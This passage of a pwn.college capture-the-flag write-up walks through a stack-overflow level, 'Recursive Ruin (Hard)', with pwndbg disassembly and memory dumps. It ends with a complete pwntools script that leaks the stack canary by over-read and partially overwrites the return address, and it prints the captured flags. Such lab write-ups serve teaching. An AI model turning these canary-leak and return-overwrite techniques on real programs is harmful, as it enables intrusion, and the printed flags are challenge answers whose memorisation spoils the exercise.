+| 0x00007ffef15f2000 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2008 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2010 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2018 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2020 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2028 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2030 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2038 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2040 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2048 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2050 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2058 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2060 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007ffef15f2068 (rsp+0x00a8) | 00 2d d7 7f 7c 5f 7f ab | 0xab7f5f7c7fd72d00 |
+| 0x00007ffef15f2070 (rsp+0x00b0) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
+| 0x00007ffef15f2078 (rsp+0x00b8) | dd 9c ee 2c 65 5a 00 00 | 0x00005a652cee9cdd |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffef15f2000
+- the saved frame pointer (of main) is at 0x7ffef15f2070
+- the saved return address (previously to main) is at 0x7ffef15f2078
+- the saved return address is now pointing to 0x5a652cee9cdd.
+- the canary is stored at 0x7ffef15f2068.
+- the canary value is now 0xab7f5f7c7fd72d00.
+- the address of win_authed() is 0x5a652cee9cc1.
+
+If you have managed to overwrite the return address with the correct value,
+challenge() will jump straight to win_authed() when it returns.
+Let's try it now!
+
+WARNING: You sent in too much data, and overwrote more than two bytes of the address.
+         This can still work, because I told you the correct address to use for
+         this execution, but you should not rely on that information.
+         You can solve this challenge by only overwriting two bytes!
+         
+You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
+call to see the hidden backdoor!
+Goodbye!
+You win! Here is your flag:
+pwn.college{crG2MXUQVih9CVfSLBT1Fk0y7hu.0VMxMDL4ITM0EzW}
+
+
+[*] Got EOF while reading in interactive
+$  
+```
+
+&nbsp;
+
+## Recursive Ruin (Hard)
+
+```
+hacker@program-security~recursive-ruin-hard:/$ /challenge/recursive-ruin-hard 
+###
+### Welcome to /challenge/recursive-ruin-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+You said: aa
+Goodbye!
+### Goodbye!
+```
+
+This time, the program does not print any data. We will have to leak the stack canary using a [Buffer over-read](https://en.wikipedia.org/wiki/Buffer_over-read) as we did in [this level](#buffer-over-read).
+
+
+We need the following information to craft our exploit:
+- [ ] Location of buffer
+- [ ] Location of canary
+- [ ] Expected substring in order to loop the challenge
+- [ ] Location of stored return address to `main()`
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+
+### Binary Analysis
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001110  __cxa_finalize@plt
+0x0000000000001120  putchar@plt
+0x0000000000001130  __errno_location@plt
+0x0000000000001140  puts@plt
+0x0000000000001150  write@plt
+0x0000000000001160  __stack_chk_fail@plt
+0x0000000000001170  printf@plt
+0x0000000000001180  geteuid@plt
+0x0000000000001190  read@plt
+0x00000000000011a0  setvbuf@plt
+0x00000000000011b0  open@plt
+0x00000000000011c0  __isoc99_scanf@plt
+0x00000000000011d0  exit@plt
+0x00000000000011e0  strerror@plt
+0x00000000000011f0  strstr@plt
+0x0000000000001200  _start
+0x0000000000001230  deregister_tm_clones
+0x0000000000001260  register_tm_clones
+0x00000000000012a0  __do_global_dtors_aux
+0x00000000000012e0  frame_dummy
+0x00000000000012e9  bin_padding
+0x0000000000001419  win_authed
+0x0000000000001536  challenge
+0x0000000000001689  main
+0x0000000000001790  __libc_csu_init
+0x0000000000001800  __libc_csu_fini
+0x0000000000001808  _fini
+```
+
+First, we can get the offset required instruction within `win_authed()`.
+
+#### `win_authed()`
+
+```
+pwndbg> disassemble win_authed 
+Dump of assembler code for function win_authed:
+   0x0000000000001419 <+0>:     endbr64
+   0x000000000000141d <+4>:     push   rbp
+   0x000000000000141e <+5>:     mov    rbp,rsp
+   0x0000000000001421 <+8>:     sub    rsp,0x10
+   0x0000000000001425 <+12>:    mov    DWORD PTR [rbp-0x4],edi
+   0x0000000000001428 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
+   0x000000000000142f <+22>:    jne    0x1533 <win_authed+282>
+   0x0000000000001435 <+28>:    lea    rdi,[rip+0xbcc]        # 0x2008
+
+# ---- snip ----
+
+   0x0000000000001533 <+282>:   nop
+   0x0000000000001534 <+283>:   leave
+   0x0000000000001535 <+284>:   ret
+End of assembler dump.
+```
+
+- [ ] Location of buffer
+- [ ] Location of canary
+- [ ] Expected substring in order to loop the challenge
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
+
+#### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000001536 <+0>:     endbr64
+   0x000000000000153a <+4>:     push   rbp
+   0x000000000000153b <+5>:     mov    rbp,rsp
+   0x000000000000153e <+8>:     sub    rsp,0x60
+   0x0000000000001542 <+12>:    mov    DWORD PTR [rbp-0x44],edi
+   0x0000000000001545 <+15>:    mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000001549 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
+   0x000000000000154d <+23>:    mov    rax,QWORD PTR fs:0x28
+   0x0000000000001556 <+32>:    mov    QWORD PTR [rbp-0x8],rax
+   0x000000000000155a <+36>:    xor    eax,eax
+   0x000000000000155c <+38>:    mov    QWORD PTR [rbp-0x20],0x0
+   0x0000000000001564 <+46>:    mov    QWORD PTR [rbp-0x18],0x0
+   0x000000000000156c <+54>:    mov    QWORD PTR [rbp-0x10],0x0
+   0x0000000000001574 <+62>:    lea    rax,[rbp-0x20]
+   0x0000000000001578 <+66>:    mov    QWORD PTR [rbp-0x28],rax
+   0x000000000000157c <+70>:    mov    QWORD PTR [rbp-0x30],0x0
+   0x0000000000001584 <+78>:    lea    rdi,[rip+0xb81]        # 0x210c
+   0x000000000000158b <+85>:    mov    eax,0x0
+   0x0000000000001590 <+90>:    call   0x1170 <printf@plt>
+   0x0000000000001595 <+95>:    lea    rax,[rbp-0x30]
+   0x0000000000001599 <+99>:    mov    rsi,rax
+   0x000000000000159c <+102>:   lea    rdi,[rip+0xb78]        # 0x211b
+   0x00000000000015a3 <+109>:   mov    eax,0x0
+   0x00000000000015a8 <+114>:   call   0x11c0 <__isoc99_scanf@plt>
+   0x00000000000015ad <+119>:   mov    rax,QWORD PTR [rbp-0x30]
+   0x00000000000015b1 <+123>:   mov    rsi,rax
+   0x00000000000015b4 <+126>:   lea    rdi,[rip+0xb65]        # 0x2120
+   0x00000000000015bb <+133>:   mov    eax,0x0
+   0x00000000000015c0 <+138>:   call   0x1170 <printf@plt>
+   0x00000000000015c5 <+143>:   mov    rdx,QWORD PTR [rbp-0x30]
+   0x00000000000015c9 <+147>:   mov    rax,QWORD PTR [rbp-0x28]
+   0x00000000000015cd <+151>:   mov    rsi,rax
+   0x00000000000015d0 <+154>:   mov    edi,0x0
+   0x00000000000015d5 <+159>:   call   0x1190 <read@plt>
+   0x00000000000015da <+164>:   mov    DWORD PTR [rbp-0x34],eax
+   0x00000000000015dd <+167>:   cmp    DWORD PTR [rbp-0x34],0x0
+   0x00000000000015e1 <+171>:   jns    0x160f <challenge+217>
+   0x00000000000015e3 <+173>:   call   0x1130 <__errno_location@plt>
+   0x00000000000015e8 <+178>:   mov    eax,DWORD PTR [rax]
+   0x00000000000015ea <+180>:   mov    edi,eax
+   0x00000000000015ec <+182>:   call   0x11e0 <strerror@plt>
+   0x00000000000015f1 <+187>:   mov    rsi,rax
+   0x00000000000015f4 <+190>:   lea    rdi,[rip+0xb4d]        # 0x2148
+   0x00000000000015fb <+197>:   mov    eax,0x0
+   0x0000000000001600 <+202>:   call   0x1170 <printf@plt>
+   0x0000000000001605 <+207>:   mov    edi,0x1
+   0x000000000000160a <+212>:   call   0x11d0 <exit@plt>
+   0x000000000000160f <+217>:   mov    rax,QWORD PTR [rbp-0x28]
+   0x0000000000001613 <+221>:   mov    rsi,rax
+   0x0000000000001616 <+224>:   lea    rdi,[rip+0xb4f]        # 0x216c
+   0x000000000000161d <+231>:   mov    eax,0x0
+   0x0000000000001622 <+236>:   call   0x1170 <printf@plt>
+   0x0000000000001627 <+241>:   mov    rax,QWORD PTR [rbp-0x28]
+   0x000000000000162b <+245>:   lea    rsi,[rip+0xb48]        # 0x217a
+   0x0000000000001632 <+252>:   mov    rdi,rax
+   0x0000000000001635 <+255>:   call   0x11f0 <strstr@plt>
+   0x000000000000163a <+260>:   test   rax,rax
+   0x000000000000163d <+263>:   je     0x1662 <challenge+300>
+   0x000000000000163f <+265>:   lea    rdi,[rip+0xb42]        # 0x2188
+   0x0000000000001646 <+272>:   call   0x1140 <puts@plt>
+   0x000000000000164b <+277>:   mov    rdx,QWORD PTR [rbp-0x58]
+   0x000000000000164f <+281>:   mov    rcx,QWORD PTR [rbp-0x50]
+   0x0000000000001653 <+285>:   mov    eax,DWORD PTR [rbp-0x44]
+   0x0000000000001656 <+288>:   mov    rsi,rcx
+   0x0000000000001659 <+291>:   mov    edi,eax
+   0x000000000000165b <+293>:   call   0x1536 <challenge>
+   0x0000000000001660 <+298>:   jmp    0x1673 <challenge+317>
+   0x0000000000001662 <+300>:   lea    rdi,[rip+0xb49]        # 0x21b2
+   0x0000000000001669 <+307>:   call   0x1140 <puts@plt>
+   0x000000000000166e <+312>:   mov    eax,0x0
+   0x0000000000001673 <+317>:   mov    rcx,QWORD PTR [rbp-0x8]
+   0x0000000000001677 <+321>:   xor    rcx,QWORD PTR fs:0x28
+   0x0000000000001680 <+330>:   je     0x1687 <challenge+337>
+   0x0000000000001682 <+332>:   call   0x1160 <__stack_chk_fail@plt>
+   0x0000000000001687 <+337>:   leave
+   0x0000000000001688 <+338>:   ret
+End of assembler dump.
+```
+
+Let's set breakpoints at `challenge+159` and `challenge+255` and run in order to get the address of the buffer and the expected substring.
+
+```
+pwndbg> break *(challenge+159)
+Breakpoint 1 at 0x15d5
+```
+
+```
+pwndbg> break *(challenge+255)
+Breakpoint 2 at 0x1635
+```
+
+```
+pwndbg> run
+Starting program: /challenge/recursive-ruin-hard 
+###
+### Welcome to /challenge/recursive-ruin-hard!
+###
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+
+Breakpoint 1, 0x00005d7f985835d5 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fff92176c60 ◂— 0
+ RBX  0x5d7f98583790 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+ RDX  2
+ RDI  0
+ RSI  0x7fff92176c60 ◂— 0
+ R8   0x23
+ R9   0x23
+ R10  0x5d7f9858413c ◂— ' bytes)!\n'
+ R11  0x246
+ R12  0x5d7f98583200 (_start) ◂— endbr64 
+ R13  0x7fff92177db0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff92176c80 —▸ 0x7fff92177cc0 ◂— 0
+ RSP  0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
+ RIP  0x5d7f985835d5 (challenge+159) ◂— call read@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5d7f985835d5 <challenge+159>    call   read@plt                    <read@plt>
+        fd: 0 (/dev/pts/0)
+        buf: 0x7fff92176c60 ◂— 0
+        nbytes: 2
+ 
+   0x5d7f985835da <challenge+164>    mov    dword ptr [rbp - 0x34], eax
+   0x5d7f985835dd <challenge+167>    cmp    dword ptr [rbp - 0x34], 0
+   0x5d7f985835e1 <challenge+171>    jns    challenge+217               <challenge+217>
+ 
+   0x5d7f985835e3 <challenge+173>    call   __errno_location@plt        <__errno_location@plt>
+ 
+   0x5d7f985835e8 <challenge+178>    mov    eax, dword ptr [rax]
+   0x5d7f985835ea <challenge+180>    mov    edi, eax
+   0x5d7f985835ec <challenge+182>    call   strerror@plt                <strerror@plt>
+ 
+   0x5d7f985835f1 <challenge+187>    mov    rsi, rax
+   0x5d7f985835f4 <challenge+190>    lea    rdi, [rip + 0xb4d]     RDI => 0x5d7f98584148 ◂— 'ERROR: Failed to read input -- %s!\n'
+   0x5d7f985835fb <challenge+197>    mov    eax, 0                 EAX => 0
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
+01:0008│-058 0x7fff92176c28 —▸ 0x7fff92177dc8 —▸ 0x7fff92178696 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-050 0x7fff92176c30 —▸ 0x7fff92177db8 —▸ 0x7fff92178677 ◂— '/challenge/recursive-ruin-hard'
+03:0018│-048 0x7fff92176c38 ◂— 0x194bfbe93
+04:0020│-040 0x7fff92176c40 —▸ 0x76b494d586a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-038 0x7fff92176c48 ◂— 0xa /* '\n' */
+06:0030│-030 0x7fff92176c50 ◂— 2
+07:0038│-028 0x7fff92176c58 —▸ 0x7fff92176c60 ◂— 0
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5d7f985835d5 challenge+159
+   1   0x5d7f9858375e main+213
+   2   0x76b494b8f083 __libc_start_main+243
+   3   0x5d7f9858322e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7fff92176c60`
+- [ ] Location of canary
+- [ ] Expected substring in order to loop the challenge
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
+
+Let's get the location of the canary as well.
+
+```
+pwndbg> x/40gx $rsi
+0x7fff92176c60: 0x0000000000000000      0x0000000000000000
+0x7fff92176c70: 0x0000000000000000      0x59db68b7f07ee600
+0x7fff92176c80: 0x00007fff92177cc0      0x00005d7f9858375e
+0x7fff92176c90: 0x0000000000001000      0x00007fff92177dc8
+0x7fff92176ca0: 0x00007fff92177db8      0x00000001001e8788
+0x7fff92176cb0: 0x00000000001e8788      0x0000000000005018
+0x7fff92176cc0: 0x0000000000008ed8      0x0000000000001000
+0x7fff92176cd0: 0x0000000600000002      0x00000000001eab80
+0x7fff92176ce0: 0x00000000001ebb80      0x00000000001ebb80
+0x7fff92176cf0: 0x00000000000001e0      0x00000000000001e0
+0x7fff92176d00: 0x0000000000000008      0x0000000400000004
+0x7fff92176d10: 0x0000000000000350      0x0000000000000350
+0x7fff92176d20: 0x0000000000000350      0x0000000000000020
+0x7fff92176d30: 0x0000000000000020      0x0000000000000008
+0x7fff92176d40: 0x0000000400000004      0x0000000000000370
+0x7fff92176d50: 0x0000000000000370      0x0000000000000370
+0x7fff92176d60: 0x0000000000000044      0x0000000000000044
+0x7fff92176d70: 0x0000000000000004      0x0000000400000007
+0x7fff92176d80: 0x00000000001e7788      0x00000000001e8788
+0x7fff92176d90: 0x00000000001e8788      0x0000000000000010
+```
+
+We can infer that the value at `0x7fff92176c78` is the canary because of the leading `\x00` byte.
+
+- [x] Location of buffer: `0x7fff92176c60`
+- [x] Location of canary: `0x7fff92176c78`
+- [ ] Expected substring in order to loop the challenge
+- [ ] Location of stored return address to `main()`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
+
+```
+pwndbg> info frame
+Stack level 0, frame at 0x7fff92176c90:
+ rip = 0x5d7f985835d5 in challenge; saved rip = 0x5d7f9858375e
+ called by frame at 0x7fff92177cd0
+ Arglist at 0x7fff92176c80, args: 
+ Locals at 0x7fff92176c80, Previous frame's sp is 0x7fff92176c90
+ Saved registers:
+  rbp at 0x7fff92176c80, rip at 0x7fff92176c88
+```
+
+- [x] Location of buffer: `0x7fff92176c60`
+- [x] Location of canary: `0x7fff92176c78`
+- [ ] Expected substring in order to loop the challenge
+- [x] Location of stored return address to `main()`: `0x7fff92176c88`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
+
+Let's continue.
+
+```
+pwndbg> c
+Continuing.
+aa
+You said: aa
+
+Breakpoint 2, 0x00005d7f98583635 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fff92176c60 ◂— 0x6161 /* 'aa' */
+ RBX  0x5d7f98583790 (__libc_csu_init) ◂— endbr64 
+ RCX  0
+*RDX  0
+*RDI  0x7fff92176c60 ◂— 0x6161 /* 'aa' */
+*RSI  0x5d7f9858417a ◂— 0x544145504552 /* 'REPEAT' */
+*R8   0xd
+*R9   0xd
+*R10  0x5d7f98584178 ◂— 0x544145504552000a /* '\n' */
+ R11  0x246
+ R12  0x5d7f98583200 (_start) ◂— endbr64 
+ R13  0x7fff92177db0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7fff92176c80 —▸ 0x7fff92177cc0 ◂— 0
+ RSP  0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
+*RIP  0x5d7f98583635 (challenge+255) ◂— call strstr@plt
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x5d7f98583635 <challenge+255>    call   strstr@plt                  <strstr@plt>
+        haystack: 0x7fff92176c60 ◂— 0x6161 /* 'aa' */
+        needle: 0x5d7f9858417a ◂— 0x544145504552 /* 'REPEAT' */
+ 
+   0x5d7f9858363a <challenge+260>    test   rax, rax
+   0x5d7f9858363d <challenge+263>    je     challenge+300               <challenge+300>
+ 
+   0x5d7f9858363f <challenge+265>    lea    rdi, [rip + 0xb42]     RDI => 0x5d7f98584188 ◂— 'Backdoor triggered! Repeating challenge()'
+   0x5d7f98583646 <challenge+272>    call   puts@plt                    <puts@plt>
+ 
+   0x5d7f9858364b <challenge+277>    mov    rdx, qword ptr [rbp - 0x58]
+   0x5d7f9858364f <challenge+281>    mov    rcx, qword ptr [rbp - 0x50]
+   0x5d7f98583653 <challenge+285>    mov    eax, dword ptr [rbp - 0x44]
+   0x5d7f98583656 <challenge+288>    mov    rsi, rcx
+   0x5d7f98583659 <challenge+291>    mov    edi, eax
+   0x5d7f9858365b <challenge+293>    call   challenge                   <challenge>
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fff92176c20 —▸ 0x76b494d5e540 ◂— 0x76b494d5e540
+01:0008│-058 0x7fff92176c28 —▸ 0x7fff92177dc8 —▸ 0x7fff92178696 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-050 0x7fff92176c30 —▸ 0x7fff92177db8 —▸ 0x7fff92178677 ◂— '/challenge/recursive-ruin-hard'
+03:0018│-048 0x7fff92176c38 ◂— 0x194bfbe93
+04:0020│-040 0x7fff92176c40 —▸ 0x76b494d586a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-038 0x7fff92176c48 ◂— 0x20000000a /* '\n' */
+06:0030│-030 0x7fff92176c50 ◂— 2
+07:0038│-028 0x7fff92176c58 —▸ 0x7fff92176c60 ◂— 0x6161 /* 'aa' */
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x5d7f98583635 challenge+255
+   1   0x5d7f9858375e main+213
+   2   0x76b494b8f083 __libc_start_main+243
+   3   0x5d7f9858322e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+- [x] Location of buffer: `0x7fff92176c60`
+- [x] Location of canary: `0x7fff92176c78`
+- [x] Expected substring in order to loop the challenge: `REPEAT`
+- [x] Location of stored return address to `main()`: `0x7fff92176c88`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1435`
+
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'error'
+
+# Initialize data
+buffer_addr = 0x7fff92176c60
+canary_addr = 0x7fff92176c78
+addr_of_saved_ip = 0x7fff92176c88
+safe_win_auth_offset = 0x1435
+
+attempt = 0
+
+while True:
+    attempt += 1
+    p = process('/challenge/recursive-ruin-hard')
+    
+    try:
+        # Standard offsets for this challenge level
+        # If your previous leak was 24, try 24, but let's verify the output
+        offset_to_canary = canary_addr - buffer_addr               # Distance from start of buffer to the canary
+        offset_to_ret = addr_of_saved_ip - (canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 
+
+        # --- STAGE 1: LEAK ---
+        p.recvuntil(b'Payload size: ')
+        p.sendline(str(offset_to_canary + 1).encode())
+
+        payload = b'REPEAT'
+        payload += b'A' * (offset_to_canary - 6)
+        payload += b'B' 
+
+        p.recvuntil(b'bytes)!')
+        p.send(payload)
+
+        # Grab the leak
+        p.recvuntil(b'AAAAAB')
+        canary_raw = p.recv(7)
+        canary = u64(canary_raw.rjust(8, b'\x00'))
+
+        # SANITY CHECK: Real canaries are random and usually don't look like "Backdo"
+        if b"Back" in canary_raw or b"door" in canary_raw:
+            if attempt % 50 == 0:
+                print(f"[*] Attempt {attempt}: Leak looks like strings. Adjusting offset...")
+            p.close()
+            continue
+
+        if attempt % 20 == 0:
+            print(f"[+] Attempt {attempt} | Valid Canary Leak: {hex(canary)}")
+
+        # --- STAGE 2: EXPLOIT ---
+        p.recvuntil(b'Payload size: ')
+        
+        # Build payload: [Padding] + [Canary] + [RBP Padding] + [RIP Partial]
+        exploit = b"A" * offset_to_canary
+        exploit += p64(canary)
+        exploit += b"B" * offset_to_ret
+        exploit += struct.pack("<H", safe_win_auth_offset)
+
+        p.sendline(str(len(exploit)).encode())
+        p.recvuntil(b'bytes)!')
+        p.send(exploit)
+
+        # Increase timeout slightly to allow the flag to print
+        output = p.recvall(timeout=1).decode(errors="ignore")
+        
+        if "pwn.college{" in output:
+            print(f"!!! FLAG FOUND ON ATTEMPT {attempt} !!!")
+            print(output)
+            break
+
+    except EOFError:
+        pass
+    finally:
+        p.close()
+```
+
+```
+hacker@program-security~recursive-ruin-hard:/$ python ~/2_script.py 
+!!! FLAG FOUND ON ATTEMPT 11 !!!
+
+You said: AAAAAAAAAAAAAAAAAAAAAAAA
+Goodbye!
+You win! Here is your flag:
+pwn.college{4wIXepUmd8EUH6XrDzc8BNIhTJ1.0lMxMDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Lingering Leftover (Easy)
+
+```
+
 ```
